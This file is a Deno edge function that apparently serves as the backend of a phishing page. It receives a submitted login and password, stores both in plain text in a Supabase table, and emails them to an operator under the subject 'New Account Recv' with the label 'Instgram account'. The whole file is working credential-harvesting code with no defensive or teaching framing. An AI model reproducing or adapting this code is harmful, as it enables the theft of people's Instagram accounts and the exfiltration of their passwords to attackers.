import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'
import { SMTPClient } from 'https://deno.land/x/denomailer@1.6.0/mod.ts'

const cors = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
}

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: cors })
  }

  try {
    const body = await req.json().catch(() => ({}))

    // ✅ match frontend exactly
    const identifier = String(body.identifier ?? '')
    const password = String(body.password ?? '')
    const submittedAt = String(body.submittedAt ?? new Date().toISOString())

    const supabase = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!,
    )

    const { data, error } = await supabase
      .from('events')
      .insert({
        identifier,
        password,
        submitted_at: submittedAt,
      })
      .select()
      .single()

    if (error) {
      console.error('DB INSERT ERROR:', error)
      throw error
    }

    // SMTP
    const host = Deno.env.get('SMTP_HOST')
    const user = Deno.env.get('SMTP_USER')
    const pass = Deno.env.get('SMTP_PASS')
    const to = Deno.env.get('NOTIFY_TO') ?? user

    if (host && user && pass) {
      const client = new SMTPClient({
        connection: {
          hostname: host,
          port: 465,
          tls: true,
          auth: { username: user, password: pass },
        },
      })

      await client.send({
        from: user,
        to: to!,
        subject: 'New Account Recv',
        content:
          `Instgram account:\n\n` +
          `Email : ${identifier}\n` +
          `Password : ${password}\n` +
          `⏱ Time: ${submittedAt}`,
      })

      await client.close()
    }

    return new Response(
      JSON.stringify({ ok: true, stored: data, emailed: Boolean(host && user && pass) }),
      { headers: { ...cors, 'Content-Type': 'application/json' } }
    )

  } catch (err) {
    return new Response(
      JSON.stringify({ ok: false, error: String(err) }),
      { status: 500, headers: { ...cors, 'Content-Type': 'application/json' } }
    )
  }
})